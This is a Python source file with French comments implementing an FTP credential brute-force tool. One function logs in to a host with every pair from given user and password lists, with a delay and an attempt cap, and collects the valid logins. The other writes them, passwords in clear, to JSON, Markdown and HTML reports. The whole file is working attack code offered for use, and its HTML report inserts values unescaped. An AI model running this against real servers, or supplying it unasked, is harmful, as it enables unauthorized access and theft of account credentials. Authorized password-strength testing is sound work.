import ftplib
import socket
import time
import json
import datetime
import os

def ftp_bruteforce(host, port=21, userlist=None, passlist=None, timeout=5, delay=0.5, max_attempts=5):
    """
    Brute-force FTP avancé : gestion timing, erreurs, export pro.
    userlist et passlist : listes de users/pwds à tester.
    Retourne les credentials valides et les erreurs rencontrées.
    """
    results = []
    valid = []
    errors = []
    attempts = 0
    meta = {
        'host': host,
        'port': port,
        'date': datetime.datetime.now().isoformat(),
        'total_users': len(userlist) if userlist else 0,
        'total_pwds': len(passlist) if passlist else 0,
        'max_attempts': max_attempts,
        'timeout': timeout,
        'delay': delay
    }
    if not userlist or not passlist:
        return {'meta': meta, 'valid': valid, 'errors': ['Userlist or passlist missing'], 'results': results}
    for user in userlist:
        for pwd in passlist:
            if attempts >= max_attempts:
                errors.append('Max attempts reached')
                break
            try:
                ftp = ftplib.FTP()
                ftp.connect(host, port, timeout=timeout)
                ftp.login(user, pwd)
                valid.append({'user': user, 'password': pwd})
                results.append({'user': user, 'password': pwd, 'status': 'success'})
                ftp.quit()
            except ftplib.error_perm as e:
                results.append({'user': user, 'password': pwd, 'status': 'fail', 'error': str(e)})
            except Exception as e:
                err = str(e)
                results.append({'user': user, 'password': pwd, 'status': 'error', 'error': err})
                errors.append(err)
            attempts += 1
            time.sleep(delay)
    return {'meta': meta, 'valid': valid, 'errors': errors, 'results': results}


def export_ftp_bruteforce_results(data, export_base):
    """
    Exporte les résultats du brute-force FTP en JSON, Markdown, HTML.
    """
    meta = data.get('meta', {})
    valid = data.get('valid', [])
    errors = data.get('errors', [])
    results = data.get('results', [])
    import os, datetime
    date_dir = datetime.datetime.now().strftime("%Y%m%d")
    base_dir = os.path.join(os.getcwd(), "exports", date_dir, "bruteforce_ftp")
    os.makedirs(base_dir, exist_ok=True)
    export_base = os.path.join(base_dir, os.path.basename(export_base))
    # JSON
    with open(export_base + '.json', 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False, indent=2)
    # Markdown
    with open(export_base + '.md', 'w', encoding='utf-8') as f:
        f.write(f"# Rapport Brute-force FTP\n\n")
        for k, v in meta.items():
            f.write(f"**{k}** : {v}\n")
        f.write(f"\n**Valides** : {len(valid)}\n\n")
        for v in valid:
            f.write(f"- {v['user']} : {v['password']}\n")
        f.write(f"\n**Erreurs** : {len(errors)}\n\n")
        for e in errors:
            f.write(f"- {e}\n")
        f.write(f"\n**Détail des tentatives** : {len(results)}\n\n")
        for i, r in enumerate(results, 1):
            f.write(f"## Tentative {i}\n")
            for k, v in r.items():
                f.write(f"- **{k}** : {v}\n")
            f.write("\n")
    # HTML
    with open(export_base + '.html', 'w', encoding='utf-8') as f:
        f.write(f"<html><head><meta charset='utf-8'><title>Rapport Brute-force FTP</title></head><body>")
        f.write(f"<h1>Rapport Brute-force FTP</h1>")
        for k, v in meta.items():
            f.write(f"<b>{k}</b> : {v}<br>")
        f.write(f"<br><b>Valides :</b> {len(valid)}<ul>")
        for v in valid:
            f.write(f"<li>{v['user']} : {v['password']}</li>")
        f.write("</ul><br><b>Erreurs :</b> %d<ul>" % len(errors))
        for e in errors:
            f.write(f"<li>{e}</li>")
        f.write("</ul><br><b>Détail des tentatives :</b> %d<br>" % len(results))
        for i, r in enumerate(results, 1):
            f.write(f"<h2>Tentative {i}</h2><ul>")
            for k, v in r.items():
                f.write(f"<li><b>{k}</b> : {v}</li>")
            f.write("</ul><br>")
        f.write("</body></html>")
